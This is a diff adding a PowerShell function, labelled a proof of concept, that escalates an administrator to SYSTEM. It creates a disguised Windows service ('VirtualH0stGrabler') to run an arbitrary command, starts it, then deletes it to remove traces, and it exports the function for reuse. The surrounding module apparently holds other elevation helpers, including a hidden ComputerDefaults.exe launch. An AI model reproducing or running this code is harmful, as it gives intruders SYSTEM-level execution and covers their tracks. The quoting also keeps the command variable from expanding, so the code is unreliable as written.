@@ -261,3 +261,21 @@ Start-Process -WindowStyle hidden "C:\Windows\System32\ComputerDefaults.exe"
 Export-ModuleMember -Function process-elevate2
 Set-Alias -Name process-elevate2 -Value process-elevate2
 
+
+#POC for Windows (you must be admin!!)
+function process-elevate2system {
+    param(
+		[string]$processName
+    )
+    $Request =  $processName
+powershell -command 'cmd /c SC CREATE VirtualH0stGrabler binpath= "cmd /c cmd /c $Request"'
+powershell -command 'cmd /c SC start VirtualH0stGrabler'
+sleep(22.5)
+powershell -command 'cmd /c SC DELETE VirtualH0stGrabler'
+}
+Export-ModuleMember -Function process-elevate2system
+Set-Alias -Name process-elevate2system -Value process-elevate2system
+
+
+
+
